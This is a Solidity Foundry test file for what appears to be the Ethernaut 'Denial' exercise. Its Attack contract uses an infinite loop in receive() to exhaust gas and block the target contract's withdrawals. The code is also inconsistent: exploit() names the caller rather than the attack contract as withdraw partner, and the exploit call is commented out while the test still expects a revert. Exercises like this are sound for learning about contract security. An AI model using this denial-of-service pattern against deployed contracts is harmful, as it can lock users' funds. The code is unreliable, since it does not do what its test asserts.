// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../src/Denial.sol";
import "@forge-std/Test.sol";

contract Attack {
    Denial public denial;
    constructor(address payable denialAddress) {
        denial = Denial(payable(denialAddress));
    }

    receive() external payable {
        while(true) {}
    }

    function exploit() public {
        denial.setWithdrawPartner(msg.sender);
        denial.withdraw();
    }
}

contract DenialTest is Test {

    Denial public denialContract;
    address public attacker;
    address public owner;

    function setUp() public {
        denialContract = new Denial();
        attacker = vm.addr(1);
        owner = address(0xA9E);
        vm.deal(attacker, 1 ether);

    }

    function testExploit() public {
        vm.startPrank(attacker);
        Attack attack = new Attack(payable(denialContract));
        // attack.exploit();
        vm.stopPrank();

        vm.startPrank(owner);
        vm.expectRevert();
        denialContract.withdraw();
        vm.stopPrank();
    }
}


